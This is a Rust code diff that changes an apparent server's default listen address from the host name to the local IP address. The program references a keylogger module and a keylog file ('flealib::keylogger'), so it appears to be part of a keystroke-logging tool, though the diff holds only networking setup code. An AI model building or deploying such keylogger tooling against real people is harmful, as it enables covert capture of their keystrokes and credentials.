@@ -6,8 +6,8 @@ extern crate getopts;
 use std::{thread, env};
 use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicBool, Ordering};
-use gethostname::gethostname;
 use getopts::Options;
+use local_ip_address::local_ip;
 
 #[macro_use]
 extern crate log;
@@ -30,12 +30,13 @@ fn main()
 
     info!("Start");
 
+    let my_local_ip = local_ip().unwrap();
     let args: Vec<String> = env::args().collect();
     let program = args[0].clone();
     
     let mut opts = Options::new();
 
-    opts.optopt("s", "server", "Server ip/name to listen on", "Leave empty to listen on the host name address");
+    opts.optopt("s", "server", "Server ip/name to listen on", "Leave empty to listen on the host ip address");
 
     let matches = match opts.parse(&args[1..]) 
     {
@@ -57,10 +58,9 @@ fn main()
     let current_path = dir.join(flealib::keylogger::KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
 
     remove_keylog_file(&current_path);
-
-    let a = gethostname();
-    let mut address: String = a.to_str().unwrap().to_string();
     
+    let mut address = my_local_ip.to_string();
+
     if host_address.is_some()
     {
         address = host_address.unwrap();
